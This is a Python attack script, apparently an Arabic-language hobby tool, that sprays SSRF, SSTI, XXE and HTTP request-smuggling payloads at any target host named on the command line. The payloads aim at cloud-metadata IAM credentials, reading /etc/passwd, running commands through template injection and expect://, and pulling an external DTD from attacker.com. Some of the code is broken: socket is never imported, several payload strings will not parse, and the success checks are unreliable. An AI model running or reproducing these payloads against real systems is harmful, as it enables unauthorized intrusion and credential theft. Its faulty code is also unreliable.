#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cheek Modern Exploits - استغلالات حديثة
المبرمج: SayerLinux
الإيميل: SaudiSayer@gmail.com
"""

import requests
import json
import base64
import urllib.parse
import time
import random
import string
import re
import dns.resolver
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class ModernExploits:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CheekModernExploit/1.0'})
        self.results = []
        self.timeout = 10
    
    def log_result(self, exploit_type, success, details=""):
        """تسجيل نتائج الاستغلال"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'exploit_type': exploit_type,
            'target': self.target,
            'success': success,
            'details': details
        }
        self.results.append(result)
        
        if success:
            print(f"{Colors.GREEN}[+] {exploit_type}: SUCCESS - {details}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] {exploit_type}: FAILED{Colors.RESET}")
    
    def ssrf_exploits(self):
        """استغلال ثغرات SSRF (Server-Side Request Forgery)"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات SSRF...{Colors.RESET}")
        
        # بايتودات SSRF
        ssrf_payloads = [
            # بايتودات أساسية
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
            'http://169.254.169.254',  # AWS Metadata
            'http://metadata.google.internal',  # GCP Metadata
            'http://instance-data',  # AWS
            
            # بايتودات متقدمة
            'http://localhost:22',
            'http://localhost:3306',
            'http://localhost:5432',
            'http://localhost:6379',
            'http://localhost:8080',
            'http://localhost:3000',
            'http://localhost:8000',
            'http://localhost:8888',
            
            # بايتودات بروتوكول متعدد
            'file:///etc/passwd',
            'file:///windows/system32/drivers/etc/hosts',
            'ftp://localhost:21',
            'gopher://localhost:70',
            'dict://localhost:11211',
            'ldap://localhost:389',
            
            # بايتودات تجاوز مرشحات
            'http://127.1',
            'http://0x7f.0.0.1',
            'http://0177.0.0.1',
            'http://2130706433',  # 127.0.0.1 in decimal
            'http://0x7f000001',  # 127.0.0.1 in hex
            'http://[0:0:0:0:0:0:0:1]',  # IPv6 localhost
            
            # بايتودات DNS rebinding
            'http://1.2.3.4.nip.io',
            'http://127.0.0.1.nip.io',
            'http://localhost.localdomain',
            'http://127.0.0.1.xip.io',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/project/',
            'http://instance-data.compute.internal/latest/meta-data/',
            
            # بايتودات استكشافية
            'http://localhost/admin',
            'http://localhost/phpmyadmin',
            'http://localhost/api',
            'http://localhost/internal',
            'http://localhost/debug',
            'http://localhost/status',
            'http://127.0.0.1:8080/manager',
            'http://127.0.0.1:9200/_cluster/health',
            'http://127.0.0.1:27017/',
        ]
        
        # نقاط النهاية المحتملة
        endpoints = [
            '',
            '/',
            '/url',
            '/link',
            '/redirect',
            '/proxy',
            '/fetch',
            '/get',
            '/load',
            '/include',
            '/import',
            '/source',
            '/file',
            '/image',
            '/avatar',
            '/upload',
            '/download',
            '/webhook',
            '/callback',
            '/api/proxy',
            '/api/redirect',
            '/api/fetch',
            '/api/webhook',
            '/v1/proxy',
            '/v1/redirect',
            '/v1/fetch',
            '/v2/proxy',
            '/v2/redirect',
            '/v2/fetch',
            '/graphql',
            '/api/v1/graphql',
            '/api/v2/graphql',
        ]
        
        # معلمات URL المحتملة
        params = [
            'url', 'link', 'redirect', 'redirect_uri', 'return', 'return_to', 'next', 
            'target', 'dest', 'destination', 'path', 'file', 'filename', 'uri', 
            'url_path', 'endpoint', 'api', 'webhook', 'callback', 'proxy', 'fetch', 
            'load', 'source', 'include', 'import', 'resource', 'location', 'address', 
            'host', 'ip', 'domain', 'site', 'page', 'content', 'data', 'json', 'xml', 'text'
        ]
        
        # اختبار SSRF
        for endpoint in endpoints:
            for param in params:
                for payload in ssrf_payloads[:10]:  # اختبار أول 10 بايتودات فقط للوقت
                    try:
                        url = f"http://{self.target}{endpoint}"
                        data = {param: payload}
                        
                        # اختبار GET
                        response = self.session.get(url, params=data, timeout=self.timeout)
                        if self.check_ssrf_success(response, payload):
                            self.log_result('SSRF', True, f"GET {url}?{param}={payload}")
                            continue
                        
                        # اختبار POST
                        response = self.session.post(url, data=data, timeout=self.timeout)
                        if self.check_ssrf_success(response, payload):
                            self.log_result('SSRF', True, f"POST {url} {param}={payload}")
                            continue
                            
                    except Exception as e:
                        continue
    
    def check_ssrf_success(self, response, payload):
        """التحقق من نجاح استغلال SSRF"""
        if response.status_code == 200:
            # علامات نجاح SSRF
            success_indicators = [
                'root:',  # /etc/passwd
                'metadata',  # cloud metadata
                'localhost',
                '127.0.0.1',
                'apache2',
                'mysql',
                'redis',
                'mongodb'
            ]
            
            content = response.text.lower()
            for indicator in success_indicators:
                if indicator in content:
                    return True
        
        # التحقق من أوقات الاستجابة
        if response.elapsed.total_seconds() > 5:
            return True
            
        return False
    
    def ssti_exploits(self):
        """استغلال ثغرات SSTI (Server-Side Template Injection)"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات SSTI...{Colors.RESET}")
        
        # بايتودات SSTI
        ssti_payloads = [
            # Jinja2 (Python)
            '{{7*7}}',
            '{{7*'7'}}',
            '{{config}}',
            '{{self}}',
            '{{request}}',
            '{{request.application}}',
            '{{request['application']}}',
            '{{request['environ']}}',
            '{{request.environ['SERVER_NAME']}}',
            '{{''.__class__.__mro__[1].__subclasses__()}}',
            '{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}',
            
            # Twig (PHP)
            '{{7*7}}',
            '{{7*'7'}}',
            '{{{{7*7}}}}',
            '{{phpinfo()}}',
            '{{_self}}',
            '{{_env}}',
            '{{app}}',
            '{{config}}',
            '{{request}}',
            '{{{{''.__class__.__mro__[1].__subclasses__()}}}}',
            
            # Freemarker (Java)
            '${7*7}',
            '${"7*7"}',
            '${{7*7}}',
            '${T(java.lang.System).getenv()}',
            '${T(java.lang.Runtime).getRuntime().exec(\"id\")}',
            '${.now}',
            '${.version}',
            
            # Velocity (Java)
            '#set($x=7*7)$x',
            '#set($x=\"7*7\")$x',
            '$request.getAttribute(\"javax.servlet.context.tempdir\")',
            '$request.getParameter(\"name\")',
            
            # Smarty (PHP)
            '{7*7}',
            '{$smarty.version}',
            '{$smarty.template}',
            '{$smarty.template_object}',
            '{$smarty.template_class}',
            '{$smarty.const.MYSQL_ASSOC}',
            '{$smarty.server.SERVER_NAME}',
            '{$smarty.env.HOSTNAME}',
            
            # Generic Bypass
            '${7*7}',
            '#{7*7}',
            '@(7*7)',
            '${{7*7}}',
            '#{{7*7}}',
            '@{{7*7}}',
            '{{request['__class__']}}',
            '{{request['__init__']}}',
            '{{request['__globals__']}}',
        ]
        
        # نقاط النهاية المحتملة
        endpoints = [
            '',
            '/',
            '/search',
            '/name',
            '/user',
            '/profile',
            '/template',
            '/render',
            '/preview',
            '/test',
            '/debug',
            '/api/render',
            '/api/template',
            '/api/preview',
            '/v1/render',
            '/v1/template',
            '/v2/render',
            '/v2/template',
        ]
        
        # معلمات URL المحتملة
        params = [
            'name', 'user', 'username', 'email', 'search', 'query', 'q', 'term',
            'keyword', 'text', 'message', 'content', 'data', 'input', 'value',
            'template', 'format', 'layout', 'style', 'theme', 'view', 'display'
        ]
        
        # اختبار SSTI
        for endpoint in endpoints:
            for param in params:
                for payload in ssti_payloads[:15]:  # اختبار أول 15 بايتودات فقط
                    try:
                        url = f"http://{self.target}{endpoint}"
                        data = {param: payload}
                        
                        # اختبار GET
                        response = self.session.get(url, params=data, timeout=self.timeout)
                        if self.check_ssti_success(response, payload):
                            self.log_result('SSTI', True, f"GET {url}?{param}={payload}")
                            continue
                        
                        # اختبار POST
                        response = self.session.post(url, data=data, timeout=self.timeout)
                        if self.check_ssti_success(response, payload):
                            self.log_result('SSTI', True, f"POST {url} {param}={payload}")
                            continue
                            
                    except Exception as e:
                        continue
    
    def check_ssti_success(self, response, payload):
        """التحقق من نجاح استغلال SSTI"""
        if response.status_code == 200:
            content = response.text
            
            # علامات نجاح SSTI
            success_patterns = [
                '49',  # 7*7
                '7*7',  # غير محسوب
                '<class',  # Python class
                'javax.servlet',  # Java
                'Smarty',  # Smarty template
                'Twig',  # Twig template
                'Jinja2',  # Jinja2 template
                'freemarker',  # Freemarker
                'velocity',  # Velocity
            ]
            
            for pattern in success_patterns:
                if pattern in content and pattern != payload:
                    return True
        
        return False
    
    def xxex_exploits(self):
        """استغلال ثغرات XXE (XML External Entity)"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات XXE...{Colors.RESET}")
        
        # بايتودات XXE
        xxe_payloads = [
            # بايتودات أساسية
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts">]>
<foo>&xxe;</foo>''',
            
            # بايتودات متقدمة
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> %xxe;]>
<foo>test</foo>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<foo>&xxe;</foo>''',
            
            # بايتودات تجاوز مرشحات
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>
<foo>&send;</foo>''',
        ]
        
        # نقاط النهاية المحتملة
        endpoints = [
            '/api/xml',
            '/api/parse',
            '/api/process',
            '/xml',
            '/parse',
            '/process',
            '/api/v1/xml',
            '/api/v2/xml',
            '/soap',
            '/wsdl',
        ]
        
        # اختبار XXE
        for endpoint in endpoints:
            for payload in xxe_payloads:
                try:
                    url = f"http://{self.target}{endpoint}"
                    headers = {'Content-Type': 'application/xml'}
                    
                    response = self.session.post(url, data=payload, headers=headers, timeout=self.timeout)
                    if self.check_xxe_success(response):
                        self.log_result('XXE', True, f"POST {url}")
                        continue
                        
                except Exception as e:
                    continue
    
    def check_xxe_success(self, response):
        """التحقق من نجاح استغلال XXE"""
        if response.status_code == 200:
            content = response.text.lower()
            
            # علامات نجاح XXE
            success_indicators = [
                'root:',  # /etc/passwd
                'localhost',
                '127.0.0.1',
                'metadata',
                'no such file',
                'permission denied'
            ]
            
            for indicator in success_indicators:
                if indicator in content:
                    return True
        
        return False
    
    def desync_exploits(self):
        """استغلال ثغرات HTTP Desync/Request Smuggling"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات HTTP Desync...{Colors.RESET}")
        
        # بايتودات HTTP Desync
        desync_payloads = [
            # CL.TE (Content-Length vs Transfer-Encoding)
            '''POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG''',
            
            # TE.CL (Transfer-Encoding vs Content-Length)
            '''POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n''',
            
            # TE.TE (Transfer-Encoding vs Transfer-Encoding)
            '''POST / HTTP/1.1\r\nHost: {target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n''',
        ]
        
        # اختبار HTTP Desync
        for payload in desync_payloads:
            try:
                # إرسال طلب غير متزامن
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target, 80))
                
                formatted_payload = payload.format(target=self.target)
                sock.send(formatted_payload.encode())
                
                response = sock.recv(4096).decode()
                sock.close()
                
                if self.check_desync_success(response):
                    self.log_result('HTTP Desync', True, "Request smuggling detected")
                    
            except Exception as e:
                continue
    
    def check_desync_success(self, response):
        """التحقق من نجاح استغلال HTTP Desync"""
        # التحقق من رموز الحالة غير المتوقعة أو التأخير
        if '400' in response or '403' in response or '500' in response:
            return True
        
        return False
    
    def generate_report(self):
        """إنشاء تقرير مفصل"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== تقرير الاستغلالات الحديثة ==={Colors.RESET}")
        
        successful_exploits = [r for r in self.results if r['success']]
        failed_exploits = [r for r in self.results if not r['success']]
        
        print(f"{Colors.YELLOW}الهدف: {Colors.GREEN}{self.target}{Colors.RESET}")
        print(f"{Colors.YELLOW}وقت الفحص: {Colors.GREEN}{datetime.now().isoformat()}{Colors.RESET}")
        print(f"{Colors.YELLOW}إجمالي الاستغلالات: {Colors.GREEN}{len(self.results)}{Colors.RESET}")
        
        if successful_exploits:
            print(f"\n{Colors.RED}[!] الثغرات التي تم استغلالها ({len(successful_exploits)}):{Colors.RESET}")
            for exploit in successful_exploits:
                print(f"{Colors.GREEN}  - {exploit['exploit_type']}: {exploit['details']}{Colors.RESET}")
        
        if failed_exploits:
            print(f"\n{Colors.BLUE}[i] الاستغلالات التي لم تنجح ({len(failed_exploits)}):{Colors.RESET}")
            for exploit in failed_exploits:
                print(f"{Colors.RED}  - {exploit['exploit_type']}{Colors.RESET}")
        
        # حفظ التقرير كملف JSON
        report_filename = f"modern_exploits_report_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(report_filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)
            print(f"\n{Colors.GREEN}[+] تم حفظ التقرير الكامل في: {report_filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] فشل حفظ التقرير: {e}{Colors.RESET}")
    
    def run_all_modern_exploits(self):
        """تشغيل جميع الاستغلالات الحديثة"""
        print(f"{Colors.CYAN}{Colors.BOLD}=== بدء استغلالات حديثة ==={Colors.RESET}")
        
        exploits = [
            self.ssrf_exploits,
            self.ssti_exploits,
            self.xxex_exploits,
            self.desync_exploits,
        ]
        
        for exploit in exploits:
            try:
                exploit()
            except Exception as e:
                print(f"{Colors.RED}[-] خطأ في الاستغلال: {e}{Colors.RESET}")
                continue
        
        self.generate_report()

# دالة مساعدة للتشغيل المستقل
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 2:
        print(f"{Colors.RED}الاستخدام: python modern_exploits.py <target>{Colors.RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    modern_exploits = ModernExploits(target)
    modern_exploits.run_all_modern_exploits()